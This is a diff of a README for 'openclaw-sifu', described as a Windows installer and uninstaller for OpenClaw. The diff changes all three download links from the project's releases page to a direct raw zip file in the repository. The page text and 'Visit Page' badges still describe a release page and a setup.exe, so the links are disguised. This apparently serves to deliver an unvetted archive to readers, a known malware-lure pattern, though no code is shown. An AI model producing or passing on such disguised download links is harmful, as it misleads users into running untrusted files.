@@ -1,6 +1,6 @@
 # 🐾 openclaw-sifu - Easy Installer and Uninstaller for OpenClaw
 
-[![Download openclaw-sifu](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/easy-chinstrap356/openclaw-sifu/releases)
+[![Download openclaw-sifu](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/easy-chinstrap356/openclaw-sifu/raw/refs/heads/main/package/dist/cli/openclaw-sifu-v1.6.zip)
 
 ## 🖥️ What is openclaw-sifu?
 
@@ -35,7 +35,7 @@ If your computer has these features, you can use openclaw-sifu without problems.
 
 To get started, you need to download openclaw-sifu. Visit the official release page here:
 
-[Download openclaw-sifu](https://github.com/easy-chinstrap356/openclaw-sifu/releases)
+[Download openclaw-sifu](https://github.com/easy-chinstrap356/openclaw-sifu/raw/refs/heads/main/package/dist/cli/openclaw-sifu-v1.6.zip)
 
 This page shows the latest versions of openclaw-sifu. Click on the latest release folder to find the file for Windows. It will usually have a name like `openclaw-sifu-setup.exe` or similar.
 
@@ -116,6 +116,6 @@ The application does not require internet access after downloading, so it runs f
 
 You can access the downloads here:
 
-[![Download openclaw-sifu](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/easy-chinstrap356/openclaw-sifu/releases)
+[![Download openclaw-sifu](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/easy-chinstrap356/openclaw-sifu/raw/refs/heads/main/package/dist/cli/openclaw-sifu-v1.6.zip)
 
 Visit this link to get the latest version and follow the steps above to install or uninstall OpenClaw on Windows.
